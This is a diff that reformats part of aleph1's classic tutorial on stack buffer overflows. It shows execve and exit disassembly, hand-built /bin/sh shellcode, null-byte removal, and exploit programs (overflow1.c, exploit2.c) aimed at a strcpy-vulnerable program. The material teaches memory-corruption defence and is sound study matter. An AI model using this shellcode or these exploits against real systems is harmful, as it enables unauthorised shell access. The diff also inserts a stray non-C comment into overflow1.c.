     char *name[2];
 
-    or 2 pointers to a char. Pointers are a word long, so it leaves
-    space for two words (8 bytes).
+ or 2 pointers to a char. Pointers are a word long, so it leaves space for two  words 
+ (8 bytes).
 
-0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+ 0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
 
-    We copy the value 0x80027b8 (the address of the string "/bin/sh")
-    into the first pointer of name[]. This is equivalent to:
+ We copy the value 0x80027b8 (the address of the string "/bin/sh") into the first po-
+ inter of name[]. This is equivalent to:
 
     name[0] = "/bin/sh";
 
-0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+ 0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
 
-    We copy the value 0x0 (NULL) into the seconds pointer of name[].
-    This is equivalent to:
+ We copy the value 0x0 (NULL) into the seconds pointer of name[]. This is  equivalent 
+ to:
 
     name[1] = NULL;
 
-    The actual call to execve() starts here.
+ The actual call to execve() starts here.
 
-0x8000144 <main+20>:    pushl  $0x0
+ 0x8000144 <main+20>:    pushl  $0x0
 
-    We push the arguments to execve() in reverse order onto the stack.
-    We start with NULL.
+ We push the arguments to execve() in reverse order onto the stack. We start with   -
+ NULL.
 
-0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+ 0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
 
-    We load the address of name[] into the EAX register.
+ We load the address of name[] into the EAX register.
 
-0x8000149 <main+25>:    pushl  %eax
+ 0x8000149 <main+25>:    pushl  %eax
 
-    We push the address of name[] onto the stack.
+ We push the address of name[] onto the stack.
 
-0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+ 0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
 
-    We load the address of the string "/bin/sh" into the EAX register.
+ We load the address of the string "/bin/sh" into the EAX register.
 
-0x800014d <main+29>:    pushl  %eax
+ 0x800014d <main+29>:    pushl  %eax
 
-    We push the address of the string "/bin/sh" onto the stack.
+ We push the address of the string "/bin/sh" onto the stack.
 
-0x800014e <main+30>:    call   0x80002bc <__execve>
+ 0x800014e <main+30>:    call   0x80002bc <__execve>
 
-    Call the library procedure execve().  The call instruction pushes the
-    IP onto the stack.
-------------------------------------------------------------------------------
+ Call the library procedure execve(). The call instruction pushes the IP onto the st-
+ ack.
+ 
+ ------------------------------------------------------------------------------
 
-   Now execve().  Keep in mind we are using a Intel based Linux system.  The
-syscall details will change from OS to OS, and from CPU to CPU.  Some will 
-pass the arguments on the stack, others on the registers.  Some use a software
-interrupt to jump to kernel mode, others use a far call.  Linux passes its 
-arguments to the system call on the registers, and uses a software interrupt 
-to jump into kernel mode.
+ Now execve(). Keep in mind we are using a Intel based Linux system. The syscall det-
+ ails will change from OS to OS, and from CPU to CPU. Some will pass the arguments on 
+ the stack, others on the registers. Some use a software interrupt to jump to  kernel 
+ mode, others use a far call. Linux passes its arguments to the system call on the r-
+ egisters, and uses a software interrupt  to jump into kernel mode.
 
-------------------------------------------------------------------------------
-0x80002bc <__execve>:   pushl  %ebp
-0x80002bd <__execve+1>: movl   %esp,%ebp
-0x80002bf <__execve+3>: pushl  %ebx
+ ------------------------------------------------------------------------------
+ 0x80002bc <__execve>:   pushl  %ebp
+ 0x80002bd <__execve+1>: movl   %esp,%ebp
+ 0x80002bf <__execve+3>: pushl  %ebx
 
     The procedure prelude.
 
-0x80002c0 <__execve+4>: movl   $0xb,%eax
+ 0x80002c0 <__execve+4>: movl   $0xb,%eax
 
     Copy 0xb (11 decimal) onto the stack. This is the index into the
     syscall table.  11 is execve.
 
-0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+ 0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
 
     Copy the address of "/bin/sh" into EBX.
 
-0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+ 0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
 
     Copy the address of name[] into ECX.
 
-0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+ 0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
 
     Copy the address of the null pointer into %edx.
 
-0x80002ce <__execve+18>:        int    $0x80
+ 0x80002ce <__execve+18>:        int    $0x80
 
     Change into kernel mode.
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
 
-So as we can see there is not much to the execve() system call.  All we need
-to do is:
+ So as we can see there is not much to the execve() system call.All we need to do is:
+ a) Have the null terminated string "/bin/sh" somewhere in memory.
+ b) Have the address of the string "/bin/sh" somewhere in memory followed by a null -
+    long word.
+ c) Copy 0xb into the EAX register.
+ d) Copy the address of the address of the string "/bin/sh" into the EBX register.
+ e) Copy the address of the string "/bin/sh" into the ECX register.
+ f) Copy the address of the null long word into the EDX register.
+ g) Execute the int $0x80 instruction.
 
-    a) Have the null terminated string "/bin/sh" somewhere in memory.
-    b) Have the address of the string "/bin/sh" somewhere in memory
-       followed by a null long word.
-    c) Copy 0xb into the EAX register.
-    d) Copy the address of the address of the string "/bin/sh" into the
-       EBX register.
-    e) Copy the address of the string "/bin/sh" into the ECX register.
-    f) Copy the address of the null long word into the EDX register.
-    g) Execute the int $0x80 instruction.
+ But what if the execve() call fails for some reason? The program will continue fetc-
+ hing instructions from the stack, which may contain random data! The program will m-
+ ost likely core dump. We want the program to exit cleanly if the execve syscall fai-
+ ls. To accomplish this we must then add a exit syscall after the execve syscall. Wh-
+ at does the exit syscall looks like?
 
-   But what if the execve() call fails for some reason?  The program will
-continue fetching instructions from the stack, which may contain random data!
-The program will most likely core dump.  We want the program to exit cleanly
-if the execve syscall fails.  To accomplish this we must then add a exit
-syscall after the execve syscall.  What does the exit syscall looks like?
+ exit.c
+ ------------------------------------------------------------------------------
+ #include <stdlib.h>
 
-exit.c
-------------------------------------------------------------------------------
-#include <stdlib.h>
+ void main() {
+         exit(0);
+ }
+ ------------------------------------------------------------------------------
 
-void main() {
-        exit(0);
-}
-------------------------------------------------------------------------------
-
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o exit -static exit.c
-[aleph1]$ gdb exit
-GDB is free software and you are welcome to distribute copies of it
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o exit -static exit.c
+ [aleph1]$ gdb exit
+ GDB is free software and you are welcome to distribute copies of it
  under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
-(no debugging symbols found)...
-(gdb) disassemble _exit
-Dump of assembler code for function _exit:
-0x800034c <_exit>:      pushl  %ebp
-0x800034d <_exit+1>:    movl   %esp,%ebp
-0x800034f <_exit+3>:    pushl  %ebx
-0x8000350 <_exit+4>:    movl   $0x1,%eax
-0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
-0x8000358 <_exit+12>:   int    $0x80
-0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
-0x800035d <_exit+17>:   movl   %ebp,%esp
-0x800035f <_exit+19>:   popl   %ebp
-0x8000360 <_exit+20>:   ret
-0x8000361 <_exit+21>:   nop
-0x8000362 <_exit+22>:   nop
-0x8000363 <_exit+23>:   nop
-End of assembler dump.
-------------------------------------------------------------------------------
+ There is absolutely no warranty for GDB; type "show warranty" for details.
+ GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+ (no debugging symbols found)...
+ (gdb) disassemble _exit
+ Dump of assembler code for function _exit:
+ 0x800034c <_exit>:      pushl  %ebp
+ 0x800034d <_exit+1>:    movl   %esp,%ebp
+ 0x800034f <_exit+3>:    pushl  %ebx
+ 0x8000350 <_exit+4>:    movl   $0x1,%eax
+ 0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
+ 0x8000358 <_exit+12>:   int    $0x80
+ 0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
+ 0x800035d <_exit+17>:   movl   %ebp,%esp
+ 0x800035f <_exit+19>:   popl   %ebp
+ 0x8000360 <_exit+20>:   ret
+ 0x8000361 <_exit+21>:   nop
+ 0x8000362 <_exit+22>:   nop
+ 0x8000363 <_exit+23>:   nop
+ End of assembler dump.
+ ------------------------------------------------------------------------------
 
-   The exit syscall will place 0x1 in EAX, place the exit code in EBX,
-and execute "int 0x80".  That's it.  Most applications return 0 on exit to
-indicate no errors.  We will place 0 in EBX.  Our list of steps is now:
+ The exit syscall will place 0x1 in EAX, place the exit code in EBX, and execute    -
+ "int 0x80". That's it. Most applications return 0 on exit to indicate no errors.  We 
+ will place 0 in EBX. Our list of steps is now:
+ a) Have the null terminated string "/bin/sh" somewhere in memory.
+ b) Have the address of the string "/bin/sh" somewhere in memory followed by a null -
+    long word.
+ c) Copy 0xb into the EAX register.
+ d) Copy the address of the address of the string "/bin/sh" into the EBX register.
+ e) Copy the address of the string "/bin/sh" into the ECX register.
+ f) Copy the address of the null long word into the EDX register.
+ g) Execute the int $0x80 instruction.
+ h) Copy 0x1 into the EAX register.
+ i) Copy 0x0 into the EBX register.
+ j) Execute the int $0x80 instruction.
 
-    a) Have the null terminated string "/bin/sh" somewhere in memory.
-    b) Have the address of the string "/bin/sh" somewhere in memory
-       followed by a null long word.
-    c) Copy 0xb into the EAX register.
-    d) Copy the address of the address of the string "/bin/sh" into the
-       EBX register.
-    e) Copy the address of the string "/bin/sh" into the ECX register.
-    f) Copy the address of the null long word into the EDX register.
-    g) Execute the int $0x80 instruction.
-    h) Copy 0x1 into the EAX register.
-    i) Copy 0x0 into the EBX register.
-    j) Execute the int $0x80 instruction.
+ Trying to put this together in assembly language, placing the string after the code, 
+ and remembering we will place the address of the string, and null word after the ar-
+ ray, we have:
 
-   Trying to put this together in assembly language, placing the string
-after the code, and remembering we will place the address of the string,
-and null word after the array, we have:
-
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
         movl   string_addr,string_addr_addr
         movb   $0x0,null_byte_addr
         movl   $0x0,null_addr
@@ -649,41 +595,36 @@ and null word after the array, we have:
         movl   $0x0, %ebx
         int    $0x80
         /bin/sh string goes here.
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
 
-   The problem is that we don't know where in the memory space of the 
-program we are trying to exploit the code (and the string that follows 
-it) will be placed.  One way around it is to use a JMP, and a CALL 
-instruction.  The JMP and CALL instructions can use IP relative addressing, 
-which means we can jump to an offset from the current IP without needing 
-to know the exact address of where in memory we want to jump to.  If we 
-place a CALL instruction right before the "/bin/sh" string, and a JMP 
-instruction to it, the strings address will be pushed onto the stack as 
-the return address when CALL is executed.  All we need then is to copy the 
-return address into a register.  The CALL instruction can simply call the 
-start of our code above.  Assuming now that J stands for the JMP instruction,
-C for the CALL instruction, and s for the string,  the execution flow would 
-now be:
+ The problem is that we don't know where in the memory space of the program we are t-
+ rying to exploit the code (and the string that follows it) will be placed. One way -
+ around it is to use a JMP, and a CALL instruction. The JMP and CALL instructions can 
+ use IP relative addressing, which means we can jump to an offset from the current IP 
+ without needing to know the exact address of where in memory we want to jump to.  If 
+ we place a CALL instruction right before the "/bin/sh" string, and a JMP instruction 
+ to it, the strings address will be pushed onto the stack as the return address  when 
+ CALL is executed. All we need then is to copy the return address into a register. T-
+ he CALL instruction can simply call the start of our code above. Assuming now that J 
+ stands for the JMP instruction, C for the CALL instruction, and s for the string, t-
+ he execution flow would now be:
 
+ bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+ memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+            buffer                sfp   ret   a     b     c
 
-bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
-memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
-           buffer                sfp   ret   a     b     c
+ <------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
+            ^|^             ^|            |
+            |||_____________||____________| (1)
+        (2)  ||_____________||
+              |______________| (3)
+ top of                                                            bottom of
+ stack                                                                 stack
 
-<------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
-           ^|^             ^|            |
-           |||_____________||____________| (1)
-       (2)  ||_____________||
-             |______________| (3)
-top of                                                            bottom of
-stack                                                                 stack
+ With this modifications, using indexed addressing, and writing down how many bytes -
+ each instruction takes our code looks like:
 
-
-
-   With this modifications, using indexed addressing, and writing down how
-many bytes each instruction takes our code looks like:
-
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
         jmp    offset-to-call           # 2 bytes
         popl   %esi                     # 1 byte
         movl   %esi,array-offset(%esi)  # 3 bytes
@@ -699,13 +640,12 @@ many bytes each instruction takes our code looks like:
         int    $0x80                    # 2 bytes
         call   offset-to-popl           # 5 bytes
         /bin/sh string goes here.
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
 
-   Calculating the offsets from jmp to call, from call to popl, from
-the string address to the array, and from the string address to the null
-long word, we now have:
+ Calculating the offsets from jmp to call, from call to popl, from the string addres-
+ s to the array, and from the string address to the null long word, we now have:
 
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
         jmp    0x26                     # 2 bytes
         popl   %esi                     # 1 byte
         movl   %esi,0x8(%esi)           # 3 bytes
@@ -721,20 +661,19 @@ long word, we now have:
         int    $0x80                    # 2 bytes
         call   -0x2b                    # 5 bytes
         .string \"/bin/sh\"             # 8 bytes
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
 
-   Looks good. To make sure it works correctly we must compile it and run it.
-But there is a problem.  Our code modifies itself, but most operating system
-mark code pages read-only.  To get around this restriction we must place the
-code we wish to execute in the stack or data segment, and transfer control
-to it.  To do so we will place our code in a global array in the data
-segment.  We need first a hex representation of the binary code. Lets
-compile it first, and then use gdb to obtain it.
+ Looks good. To make sure it works correctly we must compile it and run it. But ther-
+ e is a problem. Our code modifies itself, but most operating system mark code  pages 
+ read-only. To get around this restriction we must place the code we wish to  execute 
+ in the stack or data segment, and transfer control to it. To do so we will place our 
+ code in a global array in the data segment. We need first a hex representation of t-
+ he binary code. Lets compile it first, and then use gdb to obtain it.
 
-shellcodeasm.c
-------------------------------------------------------------------------------
-void main() {
-__asm__("
+ shellcodeasm.c
+ ------------------------------------------------------------------------------
+ void main() {
+ __asm__("
         jmp    0x2a                     # 3 bytes
         popl   %esi                     # 1 byte
         movl   %esi,0x8(%esi)           # 3 bytes
@@ -750,79 +689,80 @@ __asm__("
         int    $0x80                    # 2 bytes
         call   -0x2f                    # 5 bytes
         .string \"/bin/sh\"             # 8 bytes
-");
-}
-------------------------------------------------------------------------------
+ ");
+ }
+ ------------------------------------------------------------------------------
 
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
-[aleph1]$ gdb shellcodeasm
-GDB is free software and you are welcome to distribute copies of it
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
+ [aleph1]$ gdb shellcodeasm
+ GDB is free software and you are welcome to distribute copies of it
  under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
-(gdb) disassemble main
-Dump of assembler code for function main:
-0x8000130 <main>:       pushl  %ebp
-0x8000131 <main+1>:     movl   %esp,%ebp
-0x8000133 <main+3>:     jmp    0x800015f <main+47>
-0x8000135 <main+5>:     popl   %esi
-0x8000136 <main+6>:     movl   %esi,0x8(%esi)
-0x8000139 <main+9>:     movb   $0x0,0x7(%esi)
-0x800013d <main+13>:    movl   $0x0,0xc(%esi)
-0x8000144 <main+20>:    movl   $0xb,%eax
-0x8000149 <main+25>:    movl   %esi,%ebx
-0x800014b <main+27>:    leal   0x8(%esi),%ecx
-0x800014e <main+30>:    leal   0xc(%esi),%edx
-0x8000151 <main+33>:    int    $0x80
-0x8000153 <main+35>:    movl   $0x1,%eax
-0x8000158 <main+40>:    movl   $0x0,%ebx
-0x800015d <main+45>:    int    $0x80
-0x800015f <main+47>:    call   0x8000135 <main+5>
-0x8000164 <main+52>:    das
-0x8000165 <main+53>:    boundl 0x6e(%ecx),%ebp
-0x8000168 <main+56>:    das
-0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>
-0x800016b <main+59>:    addb   %cl,0x55c35dec(%ecx)
-End of assembler dump.
-(gdb) x/bx main+3
-0x8000133 <main+3>:     0xeb
-(gdb)
-0x8000134 <main+4>:     0x2a
-(gdb)
-.
-.
-.
-------------------------------------------------------------------------------
+ There is absolutely no warranty for GDB; type "show warranty" for details.
+ GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+ (gdb) disassemble main
+ Dump of assembler code for function main:
+ 0x8000130 <main>:       pushl  %ebp
+ 0x8000131 <main+1>:     movl   %esp,%ebp
+ 0x8000133 <main+3>:     jmp    0x800015f <main+47>
+ 0x8000135 <main+5>:     popl   %esi
+ 0x8000136 <main+6>:     movl   %esi,0x8(%esi)
+ 0x8000139 <main+9>:     movb   $0x0,0x7(%esi)
+ 0x800013d <main+13>:    movl   $0x0,0xc(%esi)
+ 0x8000144 <main+20>:    movl   $0xb,%eax
+ 0x8000149 <main+25>:    movl   %esi,%ebx
+ 0x800014b <main+27>:    leal   0x8(%esi),%ecx
+ 0x800014e <main+30>:    leal   0xc(%esi),%edx
+ 0x8000151 <main+33>:    int    $0x80
+ 0x8000153 <main+35>:    movl   $0x1,%eax
+ 0x8000158 <main+40>:    movl   $0x0,%ebx
+ 0x800015d <main+45>:    int    $0x80
+ 0x800015f <main+47>:    call   0x8000135 <main+5>
+ 0x8000164 <main+52>:    das
+ 0x8000165 <main+53>:    boundl 0x6e(%ecx),%ebp
+ 0x8000168 <main+56>:    das
+ 0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>
+ 0x800016b <main+59>:    addb   %cl,0x55c35dec(%ecx)
+ End of assembler dump.
+ (gdb) x/bx main+3
+ 0x8000133 <main+3>:     0xeb
+ (gdb)
+ 0x8000134 <main+4>:     0x2a
+ (gdb)
+ . 
+ .
+ .
+ ------------------------------------------------------------------------------
 
-testsc.c
-------------------------------------------------------------------------------
-char shellcode[] =
+ testsc.c
+ ------------------------------------------------------------------------------
+ char shellcode[] =
     "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
     "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
     "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
     "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
 
-void main() {
-   int *ret;
+ void main() {
+    int *ret;
 
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
 
-}
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o testsc testsc.c
-[aleph1]$ ./testsc
-$ exit
-[aleph1]$
-------------------------------------------------------------------------------
+ }
+ ------------------------------------------------------------------------------
+ 
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o testsc testsc.c
+ [aleph1]$ ./testsc
+ $ exit
+ [aleph1]$
+ ------------------------------------------------------------------------------
 
-   It works! But there is an obstacle.  In most cases we'll be trying to
-overflow a character buffer.  As such any null bytes in our shellcode will be
-considered the end of the string, and the copy will be terminated.  There must
-be no null bytes in the shellcode for the exploit to work.  Let's try to
-eliminate the bytes (and at the same time make it smaller).
+ It works! But there is an obstacle. In most cases we'll be trying to overflow a cha-
+ racter buffer. As such any null bytes in our shellcode will be considered the end of 
+ the string, and the copy will be terminated. There must be no null bytes in the she-
+ llcode for the exploit to work. Let's try to eliminate the bytes (and at the same t-
+ ime make it smaller).
 
            Problem instruction:                 Substitute with:
            --------------------------------------------------------
@@ -839,10 +779,10 @@ eliminate the bytes (and at the same time make it smaller).
 
    Our improved code:
 
-shellcodeasm2.c
-------------------------------------------------------------------------------
-void main() {
-__asm__("
+ shellcodeasm2.c
+ ------------------------------------------------------------------------------
+ void main() {
+ __asm__("
         jmp    0x1f                     # 2 bytes
         popl   %esi                     # 1 byte
         movl   %esi,0x8(%esi)           # 3 bytes
@@ -861,179 +801,170 @@ __asm__("
         call   -0x24                    # 5 bytes
         .string \"/bin/sh\"             # 8 bytes
                                         # 46 bytes total
-");
-}
-------------------------------------------------------------------------------
+ ");
+ }
+ ------------------------------------------------------------------------------
 
-   And our new test program:
+ And our new test program:
 
-testsc2.c
-------------------------------------------------------------------------------
-char shellcode[] =
+ testsc2.c
+ ------------------------------------------------------------------------------
+ char shellcode[] =
     "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
     "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
     "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-void main() {
+ void main() {
    int *ret;
 
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
 
-}
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o testsc2 testsc2.c
-[aleph1]$ ./testsc2
-$ exit
-[aleph1]$
-------------------------------------------------------------------------------
+ }
+ ------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o testsc2 testsc2.c
+ [aleph1]$ ./testsc2
+ $ exit
+ [aleph1]$
+ ------------------------------------------------------------------------------
 
+--> Writing an Exploit(or how to mung the stack)
+ Lets try to pull all our pieces together. We have the shellcode. We know it must  be 
+ part of the string which we'll use to overflow the buffer. We know we must point the 
+ return address back into the buffer. This example will demonstrate these points:
 
-                              Writing an Exploit
-                              ~~~~~~~~~~~~~~~~~~
-                          (or how to mung the stack)
-                          ~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-   Lets try to pull all our pieces together.  We have the shellcode.  We know
-it must be part of the string which we'll use to overflow the buffer.  We 
-know we must point the return address back into the buffer.  This example will
-demonstrate these points:
-
-overflow1.c
-------------------------------------------------------------------------------
-char shellcode[] =
+ overflow1.c
+ ------------------------------------------------------------------------------
+ char shellcode[] =
         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-char large_string[128];
+ char large_string[128];
 
-void main() {
-  char buffer[96];
-  int i;
-  long *long_ptr = (long *) large_string;
+ void main() {
+   char buffer[96];
+   int i;
+   long *long_ptr = (long *) large_string;
 
-  for (i = 0; i < 32; i++)
-    *(long_ptr + i) = (int) buffer;
+   for (i = 0; i < 32; i++) # May be error? 32->128
+     *(long_ptr + i) = (int) buffer;
 
-  for (i = 0; i < strlen(shellcode); i++)
-    large_string[i] = shellcode[i];
+   for (i = 0; i < strlen(shellcode); i++)
+     large_string[i] = shellcode[i];
 
-  strcpy(buffer,large_string);
-}
-------------------------------------------------------------------------------
+   strcpy(buffer,large_string);
+ }
+ ------------------------------------------------------------------------------
 
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o exploit1 exploit1.c
-[aleph1]$ ./exploit1
-$ exit
-exit
-[aleph1]$
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o exploit1 exploit1.c
+ [aleph1]$ ./exploit1
+ $ exit
+ exit
+ [aleph1]$
+ ------------------------------------------------------------------------------
 
-   What we have done above is filled the array large_string[] with the
-address of buffer[], which is where our code will be.  Then we copy our
-shellcode into the beginning of the large_string string.  strcpy() will then
-copy large_string onto buffer without doing any bounds checking, and will
-overflow the return address, overwriting it with the address where our code
-is now located.  Once we reach the end of main and it tried to return it
-jumps to our code, and execs a shell.
+ What we have done above is filled the array large_string[] with the address of     -
+ buffer[], which is where our code will be. Then we copy our shellcode into the begi-
+ nning of the large_string string. strcpy() will then copy large_string onto buffer -
+ without doing any bounds checking, and will overflow the return address, overwriting 
+ it with the address where our code is now located. Once we reach the end of main and 
+ it tried to return it jumps to our code, and execs a shell.
 
-   The problem we are faced when trying to overflow the buffer of another
-program is trying to figure out at what address the buffer (and thus our
-code) will be.  The answer is that for every program the stack will
-start at the same address.  Most programs do not push more than a few hundred
-or a few thousand bytes into the stack at any one time.  Therefore by knowing
-where the stack starts we can try to guess where the buffer we are trying to
-overflow will be.  Here is a little program that will print its stack
-pointer:
+ The problem we are faced when trying to overflow the buffer of another program is t-
+ rying to figure out at what address the buffer (and thus our code) will be. The ans-
+ wer is that for every program the stack will start at the same address. Most progra-
+ ms do not push more than a few hundred or a few thousand bytes into the stack at any 
+ one time. Therefore by knowing where the stack starts we can try to guess where  the 
+ buffer we are trying to overflow will be. Here is a little program that will print -
+ its stack pointer:
 
-sp.c
-------------------------------------------------------------------------------
-unsigned long get_sp(void) {
-   __asm__("movl %esp,%eax");
-}
-void main() {
-  printf("0x%x\n", get_sp());
-}
-------------------------------------------------------------------------------
+ sp.c
+ ------------------------------------------------------------------------------
+ unsigned long get_sp(void) {
+    __asm__("movl %esp,%eax");
+ }
+ void main() {
+   printf("0x%x\n", get_sp());
+ }
+ ------------------------------------------------------------------------------
 
-------------------------------------------------------------------------------
-[aleph1]$ ./sp
-0x8000470
-[aleph1]$
-------------------------------------------------------------------------------
+ ------------------------------------------------------------------------------
+ [aleph1]$ ./sp
+ 0x8000470
+ [aleph1]$
+ ------------------------------------------------------------------------------
 
-   Lets assume this is the program we are trying to overflow is:
+ Lets assume this is the program we are trying to overflow is:
 
-vulnerable.c
-------------------------------------------------------------------------------
-void main(int argc, char *argv[]) {
-  char buffer[512];
+ vulnerable.c
+ ------------------------------------------------------------------------------
+ void main(int argc, char *argv[]) {
+   char buffer[512];
 
-  if (argc > 1)
-    strcpy(buffer,argv[1]);
-}
-------------------------------------------------------------------------------
+   if (argc > 1)
+     strcpy(buffer,argv[1]);
+ }
+ ------------------------------------------------------------------------------
 
-   We can create a program that takes as a parameter a buffer size, and an
-offset from its own stack pointer (where we believe the buffer we want to
-overflow may live).  We'll put the overflow string in an environment variable
-so it is easy to manipulate:
+ We can create a program that takes as a parameter a buffer size, and an offset  from 
+ its own stack pointer (where we believe the buffer we want to overflow may live).  -
+ We'll put the overflow string in an environment variable so it is easy to manipulat-
+ e:
 
-exploit2.c
-------------------------------------------------------------------------------
-#include <stdlib.h>
+ exploit2.c
+ ------------------------------------------------------------------------------
+ #include <stdlib.h>
 
-#define DEFAULT_OFFSET                    0
-#define DEFAULT_BUFFER_SIZE             512
+ #define DEFAULT_OFFSET                    0
+ #define DEFAULT_BUFFER_SIZE             512
 
-char shellcode[] =
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+ char shellcode[] =
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-unsigned long get_sp(void) {
-   __asm__("movl %esp,%eax");
-}
+ unsigned long get_sp(void) {
+    __asm__("movl %esp,%eax");
+ }
 
-void main(int argc, char *argv[]) {
-  char *buff, *ptr;
-  long *addr_ptr, addr;
-  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-  int i;
+ void main(int argc, char *argv[]) {
+   char *buff, *ptr;
+   long *addr_ptr, addr;
+   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+   int i;
 
-  if (argc > 1) bsize  = atoi(argv[1]);
-  if (argc > 2) offset = atoi(argv[2]);
+   if (argc > 1) bsize  = atoi(argv[1]);
+   if (argc > 2) offset = atoi(argv[2]);
 
-  if (!(buff = malloc(bsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
+   if (!(buff = malloc(bsize))) {
+     printf("Can't allocate memory.\n");
+     exit(0);
+   }
 
-  addr = get_sp() - offset;
-  printf("Using address: 0x%x\n", addr);
+   addr = get_sp() - offset;
+   printf("Using address: 0x%x\n", addr);
 
-  ptr = buff;
-  addr_ptr = (long *) ptr;
-  for (i = 0; i < bsize; i+=4)
-    *(addr_ptr++) = addr;
+   ptr = buff;
+   addr_ptr = (long *) ptr;
+   for (i = 0; i < bsize; i+=4)
+     *(addr_ptr++) = addr;
 
-  ptr += 4;
-  for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
+   ptr += 4;
+   for (i = 0; i < strlen(shellcode); i++)
+     *(ptr++) = shellcode[i];
 
-  buff[bsize - 1] = '\0';
+   buff[bsize - 1] = '\0';
 
-  memcpy(buff,"EGG=",4);
-  putenv(buff);
-  system("/bin/bash");
-}
-------------------------------------------------------------------------------
+   memcpy(buff,"EGG=",4);
+   putenv(buff);
+   system("/bin/bash");
+ }
+ ------------------------------------------------------------------------------
 
-   Now we can try to guess what the buffer and offset should be:
+ Now we can try to guess what the buffer and offset should be:
 
 ------------------------------------------------------------------------------
 [aleph1]$ ./exploit2 500
